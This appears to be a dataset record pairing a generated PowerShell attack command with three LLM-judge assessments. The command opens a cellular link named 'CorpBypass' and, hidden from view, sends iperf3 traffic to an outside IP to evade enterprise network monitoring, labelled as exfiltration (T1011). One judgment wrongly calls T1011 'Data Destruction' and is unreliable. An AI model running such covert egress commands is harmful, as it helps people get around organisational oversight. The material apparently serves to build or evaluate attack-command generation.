command: netsh mbn connect interface="Cellular" connmode=name name="CorpBypass" | Out-Null; $cell=Get-NetAdapter -InterfaceAlias 'Cellular' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $cell.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList "-c 100.72.55.9 -p 53433 -B $ip -t 60"
explanation: Establishes a mobile broadband session and binds iperf3 to the Cellular interface, exfiltrating via cellular data instead of enterprise LAN (T1011).
rationale_steps: Initiate a mobile broadband connection to enable the cellular medium.
Resolve the cellular interface IP address.
Bind iperf3 to that IP on an uncommon port for data egress.
Execute hidden to reduce casual observation.

llm_judgments.syntactic_justification: The command is perfectly well-formed with proper PowerShell syntax, balanced quotes, valid piping, error handling, and correct parameter usage for all cmdlets.
llm_judgments.semantic_justification: The command aligns with T1011 (Exfiltration Over Other Network Medium) by establishing a cellular connection and using iperf3 to exfiltrate data over that channel, though it lacks actual data selection/preparation for exfiltration.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes and parentheses, proper command separators, and valid Powershell cmdlet usage and parameter formats.
llm_judgments.semantic_justification: The command establishes network connectivity and generates traffic (iperf3), which is entirely unrelated to 'Data Destruction' (T1011) as explicitly claimed in the explanation.

llm_judgments.syntactic_justification: PowerShell command is well-formed with balanced quotes, proper separators, valid netsh/cmdlet usage, and correctly structured iperf3 arguments.
llm_judgments.semantic_justification: It plausibly brings up the Cellular interface and binds iperf3 to it to create outbound traffic over a non-LAN path, but iperf3 only generates test traffic (not actual data exfiltration) and depends on an existing profile/server, so it only partially achieves the stated exfil intent.
